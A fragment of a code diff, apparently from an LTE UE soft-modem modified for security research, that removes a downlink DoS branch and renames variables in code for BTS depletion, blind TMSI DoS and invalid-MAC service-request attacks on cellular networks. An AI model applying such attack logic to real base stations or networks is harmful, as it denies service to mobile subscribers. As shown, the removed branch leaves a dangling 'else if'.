@@ -570,13 +570,6 @@ static void rrc_ue_generate_RRCConnectionSetupComplete(
   const char *nas_msg;
   int   nas_msg_length;
 
-  // Downlink DoS attack
-  if (dnlink_dos_attack > 5) {
-    LOG_I(RRC, "[Downlink DoS] encoding service request with invalid MAC\n");
-    nas_msg = _nas_service_request;
-    nas_msg_length = sizeof(_nas_service_request);
-  }
-
   // Uplink DoS attack
   else if (uplink_dos_attack /* != 0 */) {
     LOG_I(RRC, "[Uplink DoS] encoding service request with invalid MAC\n");
@@ -626,11 +619,11 @@ static void rrc_ue_generate_RRCConnectionSetupComplete(
   } while (_attack_counter-- > 0);
   
   // Re-initiate RA procedure for BTS depletion attack (DoS) or Blind DoS TMSI attack
-  if (IS_SOFTMODEM_RFSIM && (bts_attack >= 200 || tmsi_blind_dos_rrc /* > 0 */)) {
+  if (IS_SOFTMODEM_RFSIM && (bts_attack >= 200 || blind_dos_attack /* > 0 */)) {
     const char *_logEAtt;
     const char *_logIAtt;
 
-    if (tmsi_blind_dos_rrc /* > 0 */) {
+    if (blind_dos_attack /* > 0 */) {
       _logEAtt = "BLIND_DOS_ATTACK_ITEM_02";
       _logIAtt = "Blind DOS";
     }
@@ -5263,17 +5256,17 @@ void *rrc_ue_task( void *args_p ) {
         LOG_E(RRC, "[NAS MSG]: NAS_UPLINK_DATA_REQ\n");
 
         // Trigger log when we see a non-attack NAS message length
-        if (!IS_SOFTMODEM_RFSIM && (bts_attack >=5 || tmsi_blind_dos_rrc /* > 0 */) && NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length != -1) {
-	  const char *_logAtt = tmsi_blind_dos_rrc /* > 0 */ ? "BLIND_DOS_ATTACK" : "BTS_ATTACK";
+        if (!IS_SOFTMODEM_RFSIM && (bts_attack >=5 || blind_dos_attack /* > 0 */) && NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length != -1) {
+	  const char *_logAtt = blind_dos_attack /* > 0 */ ? "BLIND_DOS_ATTACK" : "BTS_ATTACK";
 
           LOG_E(RRC, "[%s NAS_UPLINK_DATA_REQ]: NAS Message Length = %i\n", _logAtt, NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length);
         }
                           
-        if ((bts_attack >=5 || tmsi_blind_dos_rrc /* > 0 */) && NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length == -1) {
+        if ((bts_attack >=5 || blind_dos_attack /* > 0 */) && NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length == -1) {
 	  const char *_logEAtt;
 	  const char *_logIAtt;
 
-	  if (tmsi_blind_dos_rrc /* > 0 */) {
+	  if (blind_dos_attack /* > 0 */) {
 	    _logEAtt = "BLIND_DOS_ATTACK_ITEM_03";
 	    _logIAtt = "Blind DOS";
 	  }
